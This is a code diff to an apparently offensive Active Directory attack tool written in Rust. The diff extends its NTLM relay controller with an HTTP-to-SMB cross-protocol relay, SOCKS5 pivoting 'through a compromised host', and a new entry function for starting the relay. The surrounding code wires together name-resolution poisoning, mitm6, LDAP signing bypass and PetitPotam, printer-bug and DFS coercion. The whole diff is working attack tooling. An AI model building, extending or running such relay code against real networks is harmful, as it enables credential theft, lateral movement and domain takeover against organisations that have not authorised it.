@@ -5,6 +5,7 @@
 
 pub mod adcs_relay;
 pub mod exchange;
+pub mod http_relay;
 pub mod mitm6;
 pub mod poisoner;
 pub mod relay;
@@ -14,6 +15,7 @@ pub mod utils;
 
 // Re-export types from submodules
 pub use adcs_relay::{AdcsRelay, AdcsRelayConfig};
+pub use http_relay::{HttpRelay, HttpRelayConfig};
 pub use relay::RelayStats;
 pub use responder::CapturedCredential;
 pub use smb_daemon::{SmbDaemon, SmbDaemonConfig, SmbDaemonMode};
@@ -22,6 +24,8 @@ pub use overthrone_core::error::RelayError;
 use overthrone_core::error::Result;
 use overthrone_core::proto::{trigger_dfs_coerce, trigger_petitpotam, trigger_printer_bug};
 use std::net::SocketAddr;
+use std::sync::Arc;
+use tokio::sync::Mutex as TokioMutex;
 use tracing::{info, warn};
 
 /// Protocol for relay targets
@@ -123,14 +127,18 @@ pub enum ControllerState {
     Error(String),
 }
 
-/// Main relay controller that coordinates poisoner and relay components
+/// Main relay controller that coordinates poisoner and relay components.
+///
+/// The relay is wrapped in `Arc<TokioMutex<>>` so it can be shared with the
+/// responder's HTTP server for asymmetric relay (e.g., HTTP -> SMB).
 pub struct RelayController {
     config: RelayControllerConfig,
     _state: ControllerState,
     poisoner: Option<poisoner::Poisoner>,
     mitm6: Option<mitm6::Mitm6>,
     responder: Option<responder::Responder>,
-    relay: Option<relay::NtlmRelay>,
+    relay: Option<Arc<TokioMutex<relay::NtlmRelay>>>,
+    http_relay: Option<http_relay::HttpRelay>,
 }
 
 #[derive(Debug, Clone)]
@@ -165,6 +173,10 @@ pub struct RelayControllerConfig {
     pub ldap_signing_bypass: bool,
     /// Optional mTLS client identity for outbound TLS connections.
     pub tls_client_identity: Option<crate::relay::TlsIdentity>,
+    /// Optional SOCKS5 proxy for outbound relay connections (format: `host:port`).
+    /// When set, all outbound NTLM relay connections route through this SOCKS5 proxy
+    /// instead of connecting directly. Useful for pivoting through a compromised host.
+    pub socks5_proxy: Option<String>,
     /// Hosts to automatically coerce into authenticating to this relay.
     /// Each host will be targeted with printer-bug, petitpotam, and DFS coercion.
     pub auto_coerce_targets: Vec<String>,
@@ -172,12 +184,18 @@ pub struct RelayControllerConfig {
     /// Typically the relay's own IP on the target network.
     /// Required when `auto_coerce_targets` is non-empty.
     pub auto_coerce_listener: Option<String>,
+    /// Configuration for standalone HTTP asymmetric relay listener.
+    /// When set, starts an HTTP listener that relays captured NTLM tokens
+    /// to the configured target protocols (SMB, LDAP, etc.).
+    /// Independent of the responder/poisoner — useful when coerced auth
+    /// lands directly on HTTP and needs to pivot to SMB.
+    pub http_relay_config: Option<HttpRelayConfig>,
 }
 
 impl Default for RelayControllerConfig {
     fn default() -> Self {
         Self {
-            interface: "0.0.0.0".to_string(),
+            interface: "::".to_string(),
             llmnr: true,
             nbtns: true,
             mdns: false,
@@ -190,8 +208,10 @@ impl Default for RelayControllerConfig {
             no_poison: false,
             ldap_signing_bypass: true,
             tls_client_identity: None,
+            socks5_proxy: None,
             auto_coerce_targets: Vec::new(),
             auto_coerce_listener: None,
+            http_relay_config: None,
         }
     }
 }
@@ -206,6 +226,7 @@ impl RelayController {
             mitm6: None,
             responder: None,
             relay: None,
+            http_relay: None,
         }
     }
 
@@ -269,12 +290,35 @@ impl RelayController {
                 max_retries: 3,
                 max_connections: 64,
                 tls_client_identity: self.config.tls_client_identity.clone(),
+                socks5_proxy: self.config.socks5_proxy.clone(),
             };
-            self.relay = Some(relay::NtlmRelay::new(relay_config));
+            let ntlm_relay = relay::NtlmRelay::new(relay_config);
+            let relay_arc = Arc::new(TokioMutex::new(ntlm_relay));
+
+            // Wire the responder bridge for asymmetric relay (e.g., HTTP -> SMB).
+            // The responder's HTTP server will forward NTLM tokens through the
+            // relay engine, enabling cross-protocol relay from any responder
+            // listener to any target protocol.
+            if let Some(ref mut responder) = self.responder {
+                responder.set_relay(relay_arc.clone(), tokio::runtime::Handle::current());
+                info!("Responder bridge wired for asymmetric relay");
+            }
+
             info!(
                 "NTLM relay initialized with {} target(s)",
                 self.config.relay_targets.len()
             );
+            self.relay = Some(relay_arc);
+        }
+
+        // Initialize standalone HTTP relay if configured
+        if let Some(ref http_config) = self.config.http_relay_config {
+            let http_relay = http_relay::HttpRelay::new(http_config.clone());
+            info!(
+                "HTTP asymmetric relay initialized with {} target(s)",
+                http_config.targets.len()
+            );
+            self.http_relay = Some(http_relay);
         }
 
         Ok(())
@@ -299,9 +343,15 @@ impl RelayController {
             info!("Responder started");
         }
 
-        if let Some(ref mut relay) = self.relay {
-            relay.start().await?;
+        if let Some(ref relay) = self.relay {
+            let mut guard = relay.lock().await;
+            guard.start().await?;
             info!("NTLM relay started");
+        }
+
+        if let Some(ref mut http_relay) = self.http_relay {
+            http_relay.start().await?;
+            info!("HTTP asymmetric relay started");
         }
 
         info!("All services started successfully");
@@ -371,8 +421,13 @@ impl RelayController {
             responder.stop().await?;
         }
 
-        if let Some(ref mut relay) = self.relay {
-            relay.stop().await?;
+        if let Some(ref relay) = self.relay {
+            let mut guard = relay.lock().await;
+            guard.stop().await?;
+        }
+
+        if let Some(ref mut http_relay) = self.http_relay {
+            http_relay.stop().await?;
         }
 
         info!("All services stopped");
@@ -391,7 +446,9 @@ impl RelayController {
     /// Get relay statistics
     pub fn get_relay_stats(&self) -> RelayStats {
         if let Some(ref relay) = self.relay {
-            relay.get_stats()
+            relay.try_lock()
+                .map(|guard| guard.get_stats())
+                .unwrap_or_default()
         } else {
             RelayStats::default()
         }
@@ -414,8 +471,10 @@ pub async fn run_responder(interface: &str, challenge: Option<&str>) -> Result<R
         no_poison: false,
         ldap_signing_bypass: true,
         tls_client_identity: None,
+        socks5_proxy: None,
         auto_coerce_targets: Vec::new(),
         auto_coerce_listener: None,
+        http_relay_config: None,
     };
 
     let mut controller = RelayController::new(config);
@@ -445,8 +504,51 @@ pub async fn run_relay_attack(
         no_poison: false,
         ldap_signing_bypass: true,
         tls_client_identity: None,
+        socks5_proxy: None,
         auto_coerce_targets: Vec::new(),
         auto_coerce_listener: None,
+        http_relay_config: None,
+    };
+
+    let mut controller = RelayController::new(config);
+    controller.initialize().await?;
+    controller.start().await?;
+
+    Ok(controller)
+}
+
+pub async fn run_http_asymmetric_relay(
+    interface: &str,
+    listen_port: u16,
+    targets: Vec<RelayTarget>,
+    socks5_proxy: Option<String>,
+) -> Result<RelayController> {
+    let config = RelayControllerConfig {
+        interface: interface.to_string(),
+        llmnr: false,
+        nbtns: false,
+        mdns: false,
+        mitm6: false,
+        responder: false,
+        relay_targets: Vec::new(),
+        challenge: None,
+        wpad_script: None,
+        downgrade_auth: false,
+        no_poison: true,
+        ldap_signing_bypass: true,
+        tls_client_identity: None,
+        socks5_proxy: socks5_proxy.clone(),
+        auto_coerce_targets: Vec::new(),
+        auto_coerce_listener: None,
+        http_relay_config: Some(HttpRelayConfig {
+            listen_ip: interface.to_string(),
+            listen_port,
+            targets,
+            socks5_proxy,
+            ldap_signing_bypass: true,
+            max_retries: 3,
+            timeout_secs: 30,
+        }),
     };
 
     let mut controller = RelayController::new(config);
@@ -463,7 +565,7 @@ mod tests {
     #[test]
     fn test_relay_controller_config_default() {
         let config = RelayControllerConfig::default();
-        assert_eq!(config.interface, "0.0.0.0");
+        assert_eq!(config.interface, "::");
         assert!(config.llmnr);
         assert!(config.nbtns);
         assert!(!config.mdns);
